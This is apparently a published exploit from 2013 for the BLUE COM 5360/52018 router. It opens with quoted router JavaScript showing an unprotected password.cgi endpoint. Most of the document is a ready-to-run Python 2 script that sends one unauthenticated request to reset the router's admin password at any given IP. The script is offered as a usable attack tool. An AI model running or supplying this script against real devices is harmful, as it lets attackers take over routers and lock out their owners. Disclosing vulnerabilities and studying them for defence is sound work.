# Exploit Title: BLUE COM Router - 5360/52018 Password Reset Exploit
# Date: 20/1/2013
# Exploit Author: KAI (kaisai12)
# Home: CEH.VN
# Version: BCOM - 5360

# vulnerability - change password easy ! no protect !
#var loc = 'password.cgi?';
#switch ( idx ) {
#         case 2:
#            loc += 'sptPassword=' + encodeUrl(pwdNew.value);
#            break;
#         case 3:
#            loc += 'usrPassword=' + encodeUrl(pwdNew.value);
#            break;
#         default:
#            loc += 'sysPassword=' + encodeUrl(pwdNew.value);
#            break;
#      }
#
#      var code = 'location="' + loc + '"';
#      eval(code);
#   }
#}


import urllib
import sys

def attackrouter(ip,password):
    try:
        params = urllib.urlencode({'sysPassword': str(password)})
        f = urllib.urlopen("http://"+ip+"/password.cgi?%s" % params)
        print "[+] IP: %s - Reset password: %s" % (ip,password)
        return
    except:
        print "[-] error"
       

def main():
    if len(sys.argv) > 2:
       ip = sys.argv[1]
       password = sys.argv[2]
       print "--------------------------------------------------"
       print "Router BCOM Exploit Execute Reset password modem  "
       print "                             author: KAI(CEH>VN)  "
       print "--------------------------------------------------"
       print "[+] Sending exploit: OK"
       attackrouter(ip,password)
    else:
        print "[-] Command error"
        print "[-] Use:bluecomRT.py <ip> <password>"

if __name__ == '__main__':
     main()